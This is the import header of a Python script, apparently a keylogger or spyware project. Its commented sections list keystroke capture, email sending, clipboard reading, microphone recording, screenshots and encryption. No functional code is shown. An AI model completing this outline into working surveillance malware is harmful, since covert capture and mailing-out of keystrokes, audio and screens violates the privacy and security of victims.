# logging keys
from pynput.keyboard import Key, Listener

# Email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# computer info
import socket
import platform

# clipboard
import win32clipboard

# microphone
from scipy.io.wavfile import write
import sounddevice as sd

# screenshot
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# cryptography
from cryptography.fernet import Fernet

# other libraries
import time
import os

import getpass
from requests import get
